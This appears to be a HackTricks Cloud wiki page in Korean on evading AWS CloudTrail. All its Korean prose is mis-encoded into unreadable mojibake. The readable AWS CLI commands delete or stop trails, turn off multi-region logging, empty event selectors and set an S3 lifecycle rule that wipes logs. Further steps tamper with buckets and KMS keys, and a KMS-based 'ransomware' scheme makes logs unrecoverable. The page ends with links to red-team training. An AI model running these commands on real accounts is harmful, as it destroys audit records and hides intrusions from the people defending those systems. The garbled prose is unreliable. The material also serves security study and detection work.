íŠ¹ì • AWS ì„œë¹„ìŠ¤ëŠ” **ë°ì´í„°ë² ì´ìŠ¤** ë˜ëŠ” **Kubernetes** í´ëŸ¬ìŠ¤í„° (EKS)ì™€ ê°™ì€ **ì¸í”„ë¼ë¥¼ ìƒì„±**í•©ë‹ˆë‹¤. ì‚¬ìš©ìê°€ **ì´ëŸ¬í•œ ì„œë¹„ìŠ¤ì— ì§ì ‘ í†µì‹ ** (Kubernetes APIì™€ ê°™ì€)í•˜ë©´ **AWS APIë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ**, CloudTrailì€ ì´ í†µì‹ ì„ ë³¼ ìˆ˜ ì—†ìŠµë‹ˆë‹¤.

ë”°ë¼ì„œ EKSì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ì‚¬ìš©ìê°€ EKS APIì˜ URLì„ ë°œê²¬í•˜ë©´ ë¡œì»¬ì—ì„œ í† í°ì„ ìƒì„±í•˜ê³  **CloudTrailì— ê°ì§€ë˜ì§€ ì•Šê³  API ì„œë¹„ìŠ¤ì— ì§ì ‘ í†µì‹ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ìì„¸í•œ ë‚´ìš©ì€:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### CloudTrail êµ¬ì„± ìˆ˜ì •

#### íŠ¸ë ˆì¼ ì‚­ì œ
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### íŠ¸ë ˆì¼ ì¤‘ì§€
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### ë‹¤ì¤‘ ì§€ì—­ ë¡œê¹… ë¹„í™œì„±í™”

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### ì´ë²¤íŠ¸ ì„ íƒê¸°ë¡œ ë¡œê¹… ë¹„í™œì„±í™”

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

ì²« ë²ˆì§¸ ì˜ˆì—ì„œëŠ” ë‹¨ì¼ ê°ì²´ê°€ í¬í•¨ëœ JSON ë°°ì—´ë¡œ ë‹¨ì¼ ì´ë²¤íŠ¸ ì„ íƒê¸°ê°€ ì œê³µë©ë‹ˆë‹¤. `"ReadWriteType": "ReadOnly"`ëŠ” **ì´ë²¤íŠ¸ ì„ íƒê¸°ê°€ ì½ê¸° ì „ìš© ì´ë²¤íŠ¸ë§Œ ìº¡ì²˜í•´ì•¼ í•¨**ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤(ì˜ˆë¥¼ ë“¤ì–´ CloudTrail ì¸ì‚¬ì´íŠ¸ëŠ” **ì“°ê¸°** ì´ë²¤íŠ¸ë¥¼ í™•ì¸í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤).

íŠ¹ì • ìš”êµ¬ ì‚¬í•­ì— ë”°ë¼ ì´ë²¤íŠ¸ ì„ íƒê¸°ë¥¼ ì‚¬ìš©ì ì •ì˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### S3 ìˆ˜ëª… ì£¼ê¸° ì •ì±…ì„ í†µí•œ ë¡œê·¸ ì‚­ì œ

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### ë²„í‚· êµ¬ì„± ìˆ˜ì •

* S3 ë²„í‚· ì‚­ì œ
* CloudTrail ì„œë¹„ìŠ¤ì—ì„œì˜ ëª¨ë“  ì“°ê¸°ë¥¼ ê±°ë¶€í•˜ë„ë¡ ë²„í‚· ì •ì±… ë³€ê²½
* ê°ì²´ ì‚­ì œë¥¼ ìœ„í•œ S3 ë²„í‚·ì˜ ìˆ˜ëª… ì£¼ê¸° ì •ì±… ì¶”ê°€
* CloudTrail ë¡œê·¸ë¥¼ ì•”í˜¸í™”í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” KMS í‚¤ ë¹„í™œì„±í™”

### CloudTrail ëœì„¬ì›¨ì–´

#### S3 ëœì„¬ì›¨ì–´

**ë¹„ëŒ€ì¹­ í‚¤**ë¥¼ **ìƒì„±**í•˜ê³  **CloudTrailì´ í•´ë‹¹ í‚¤ë¡œ ë°ì´í„°ë¥¼ ì•”í˜¸í™”**í•˜ê²Œ í•œ ë‹¤ìŒ **ê°œì¸ í‚¤ë¥¼ ì‚­ì œ**í•˜ì—¬ CloudTrail ë‚´ìš©ì´ ë³µêµ¬ë  ìˆ˜ ì—†ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ë‹¤ìŒì—ì„œ ì„¤ëª…ëœ **S3-KMS ëœì„¬ì›¨ì–´**ì…ë‹ˆë‹¤:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS ëœì„¬ì›¨ì–´**

ì´ëŠ” ì´ì „ ê³µê²©ì„ ìˆ˜í–‰í•˜ëŠ” ê°€ì¥ ì‰¬ìš´ ë°©ë²•ìœ¼ë¡œ, ë‹¤ë¥¸ ê¶Œí•œ ìš”êµ¬ ì‚¬í•­ì´ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **ì°¸ê³ ë¬¸í—Œ**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê³  ì—°ìŠµí•˜ê¸°:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê³  ì—°ìŠµí•˜ê¸°: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
